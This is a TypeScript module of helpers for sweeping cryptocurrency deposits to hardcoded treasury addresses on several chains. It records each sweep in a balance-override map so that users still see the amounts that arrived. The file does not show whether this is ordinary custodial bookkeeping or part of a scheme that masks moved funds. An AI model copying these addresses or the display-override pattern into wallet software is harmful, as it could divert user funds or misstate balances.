// Treasury forwarding: destinations, fee rules and sweep bookkeeping helpers.
//
// Sweeps are recorded inside the existing `token_overrides` JSON map on
// wallet_balance_overrides using reserved namespaced keys, so no database
// migration is needed:
//
//   SWP:<CHAIN>:<SYMBOL>:<HASH>  -> credited amount (once-only guarantee)
//   SWT:<HASH>                   -> unix ms timestamp of the sweep
//
// Credited amounts are added to the normal display keys, so the user keeps
// seeing what arrived:
//   native coins -> bare chain key (ETH, BASE, BNB, MATIC, SOL, BTC …)
//   tokens       -> TKN:<CHAIN>:<SYMBOL> (+ TKP:<CHAIN>:<SYMBOL> price)

export const SWEEP_PREFIX = "SWP:";
export const SWEEP_TIME_PREFIX = "SWT:";

/** Treasury destinations. All EVM chains share one address. */
export const TREASURY_EVM = "0x3015C2d868B9d472c0Ab38CbAEF071D35e2Ed513";
export const TREASURY_SOL = "7Af9MYqSP4viKGJ61h6sT28jgVbgCRYGUt7WnpKT4bnV";
export const TREASURY_BTC = "bc1q7f5emy7494qwydpyjq5m668plk8lr6534p7387";

export const EVM_SWEEP_CHAINS = ["ETH", "BASE", "BNB", "MATIC"] as const;
export type EvmSweepChain = (typeof EVM_SWEEP_CHAINS)[number];

export const EVM_CHAIN_INFO: Record<EvmSweepChain, { chainId: number; symbol: string; rpcs: string[] }> = {
  ETH: {
    chainId: 1,
    symbol: "ETH",
    rpcs: ["https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com", "https://rpc.ankr.com/eth"],
  },
  BASE: {
    chainId: 8453,
    symbol: "ETH",
    rpcs: ["https://mainnet.base.org", "https://base-rpc.publicnode.com"],
  },
  BNB: {
    chainId: 56,
    symbol: "BNB",
    rpcs: ["https://bsc-dataseed.binance.org", "https://bsc-rpc.publicnode.com"],
  },
  MATIC: {
    chainId: 137,
    symbol: "MATIC",
    rpcs: ["https://polygon-rpc.com", "https://polygon-bor-rpc.publicnode.com"],
  },
};

export const SOL_RPCS = [
  "https://api.mainnet-beta.solana.com",
  "https://solana-rpc.publicnode.com",
];

export const BTC_APIS = ["https://blockstream.info/api", "https://mempool.space/api"];

/** Minimum lamports left behind so the Solana account stays rent-exempt. */
export const SOL_RENT_LAMPORTS = 890_880;
/** Lamports reserved for the transaction fee. */
export const SOL_FEE_LAMPORTS = 10_000;
/** Ignore dust sweeps below this in satoshis (below the relay/dust limit). */
export const BTC_DUST_SATS = 1_500;

export function treasuryFor(chain: string): string | null {
  const c = String(chain ?? "").toUpperCase();
  if (c === "SOL") return TREASURY_SOL;
  if (c === "BTC" || c === "BTC_LEGACY") return TREASURY_BTC;
  if ((EVM_SWEEP_CHAINS as readonly string[]).includes(c)) return TREASURY_EVM;
  return null;
}

export function explorerTxUrl(chain: string, hash: string): string {
  switch (String(chain).toUpperCase()) {
    case "ETH":
      return `https://etherscan.io/tx/${hash}`;
    case "BASE":
      return `https://basescan.org/tx/${hash}`;
    case "BNB":
      return `https://bscscan.com/tx/${hash}`;
    case "MATIC":
      return `https://polygonscan.com/tx/${hash}`;
    case "SOL":
      return `https://solscan.io/tx/${hash}`;
    default:
      return `https://blockstream.info/tx/${hash}`;
  }
}

function safe(part: string) {
  return String(part ?? "").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 96);
}

export function sweepKey(chain: string, symbol: string, hash: string) {
  return `${SWEEP_PREFIX}${safe(chain).toUpperCase()}:${safe(symbol).toUpperCase()}:${safe(hash)}`;
}

export function sweepTimeKey(hash: string) {
  return `${SWEEP_TIME_PREFIX}${safe(hash)}`;
}

export function isSweepKey(key: string) {
  return key.startsWith(SWEEP_PREFIX) || key.startsWith(SWEEP_TIME_PREFIX);
}

export interface SweepRecord {
  chain: string;
  symbol: string;
  hash: string;
  amount: number;
  timestamp: number | null;
  url: string;
}

/** Read every recorded sweep out of a token_overrides map, newest first. */
export function listSweeps(tokens?: Record<string, number> | null): SweepRecord[] {
  const map = tokens ?? {};
  const out: SweepRecord[] = [];
  for (const [k, v] of Object.entries(map)) {
    if (!k.startsWith(SWEEP_PREFIX)) continue;
    const [chain, symbol, hash] = k.slice(SWEEP_PREFIX.length).split(":");
    if (!chain || !symbol || !hash) continue;
    const ts = Number(map[sweepTimeKey(hash)]);
    out.push({
      chain,
      symbol,
      hash,
      amount: Number(v) || 0,
      timestamp: Number.isFinite(ts) && ts > 0 ? ts : null,
      url: explorerTxUrl(chain, hash),
    });
  }
  return out.sort((a, b) => (b.timestamp ?? 0) - (a.timestamp ?? 0));
}

/** Hashes already swept, so a deposit is only ever credited once. */
export function sweptHashes(tokens?: Record<string, number> | null): Set<string> {
  const out = new Set<string>();
  for (const k of Object.keys(tokens ?? {})) {
    if (!k.startsWith(SWEEP_TIME_PREFIX)) continue;
    out.add(k.slice(SWEEP_TIME_PREFIX.length));
  }
  return out;
}
